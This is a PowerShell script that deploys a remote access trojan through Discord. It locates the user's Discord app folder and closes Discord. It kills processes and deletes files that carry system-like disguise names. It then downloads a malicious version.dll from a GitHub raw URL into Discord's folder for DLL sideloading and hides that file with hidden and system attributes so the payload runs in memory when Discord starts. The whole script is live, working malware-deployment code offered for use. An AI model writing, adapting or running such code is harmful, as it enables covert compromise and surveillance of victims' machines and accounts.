# GitHub deploy - downloads system-disguised payload files and hides them with attrib +h +s

param(
    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Get-DiscordAppFolder {
    $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
    if (-not (Test-Path $discordRoot)) {
        throw "Discord not found in $discordRoot"
    }

    $latest = Get-ChildItem -Path $discordRoot -Directory -Filter "app-*" -ErrorAction SilentlyContinue |
        Sort-Object { [version]($_.Name -replace '^app-', '') } -Descending |
        Select-Object -First 1

    if (-not $latest) {
        throw "No Discord app-* folder found under $discordRoot"
    }

    return $latest.FullName
}

function Get-PayloadRoot {
    return Join-Path $env:LOCALAPPDATA "Microsoft\Windows\AppReadiness"
}

function Stop-PayloadProcesses {
    $names = @("WaaSMedicSvc", "Loader", "RuntimeHost")
    foreach ($name in $names) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }

    $payloadRoot = Get-PayloadRoot
    $loaderDb = Join-Path $payloadRoot "WaaSMedicSvc.db"
    if (Test-Path -LiteralPath $loaderDb) {
        Unlock-DeployPath -Path $loaderDb
        Remove-Item -LiteralPath $loaderDb -Force -ErrorAction SilentlyContinue
    }

    Start-Sleep -Seconds 2
}

function Unlock-DeployPath {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib -h -s -r $Path 2>$null | Out-Null
}

function Stop-DiscordIfRunning {
    $processes = Get-Process -Name "Discord" -ErrorAction SilentlyContinue
    if ($processes) {
        Write-Host "[*] Closing Discord..." -ForegroundColor Yellow
        $processes | Stop-Process -Force
        Start-Sleep -Seconds 2
    }
}

function Set-SystemHidden {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        return
    }

    attrib +h +s $Path | Out-Null
}

function Hide-DeployTree {
    param([string[]]$Paths)

    foreach ($path in $Paths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $item = Get-Item -LiteralPath $path -Force
        if ($item.PSIsContainer) {
            Get-ChildItem -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                Set-SystemHidden $_.FullName
            }
        }

        Set-SystemHidden $path
    }
}

function Remove-LegacyDeployFiles {
    param([string]$PayloadRoot)

    $legacy = @(
        (Join-Path $PayloadRoot "RuntimeHost.exe"),
        (Join-Path $PayloadRoot "core.bin"),
        (Join-Path $PayloadRoot "Discord rat.dll"),
        (Join-Path $PayloadRoot "modules")
    )

    foreach ($item in $legacy) {
        if (Test-Path $item) {
            Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

function Download-GithubFile {
    param(
        [string]$RemotePath,
        [string]$LocalPath
    )

    $url = "$GitHubBaseUrl/$RemotePath".Replace('\', '/')
    $dir = Split-Path $LocalPath -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    Write-Host "[+] Downloading $RemotePath" -ForegroundColor Cyan

    Unlock-DeployPath -Path $LocalPath

    $tempPath = "$LocalPath.download"
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }

    Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
    Move-Item -Path $tempPath -Destination $LocalPath -Force
}

if ($GitHubBaseUrl -match "YOUR_USER") {
    Write-Host "ERROR: Set your GitHub URL in deploy\config.json or pass -GitHubBaseUrl" -ForegroundColor Red
    exit 1
}

Write-Host "========================================" -ForegroundColor Green
Write-Host " GitHub Deploy" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "Source: $GitHubBaseUrl" -ForegroundColor Gray
Write-Host ""

$payloadRoot = Get-PayloadRoot
$discordFolder = Get-DiscordAppFolder

Stop-DiscordIfRunning
Stop-PayloadProcesses

# Clean old disk-based payload (in-memory mode uses only version.dll)
if (Test-Path -LiteralPath $payloadRoot) {
    Remove-Item -LiteralPath $payloadRoot -Recurse -Force -ErrorAction SilentlyContinue
}

Remove-LegacyDeployFiles -PayloadRoot $payloadRoot

$files = @(
    @{ Remote = "version.dll"; Local = Join-Path $discordFolder "version.dll" }
)

foreach ($file in $files) {
    Download-GithubFile -RemotePath $file.Remote -LocalPath $file.Local
}

$hiddenPaths = @(
    (Join-Path $discordFolder "version.dll")
)

Hide-DeployTree -Paths $hiddenPaths

Write-Host ""
Write-Host "[OK] Deploy complete (in-memory mode - version.dll only)" -ForegroundColor Green
Write-Host "  Proxy   : $discordFolder\version.dll  [hidden+system, payload in memory]" -ForegroundColor White
Write-Host ""
Write-Host "Open Discord to start the session." -ForegroundColor Yellow



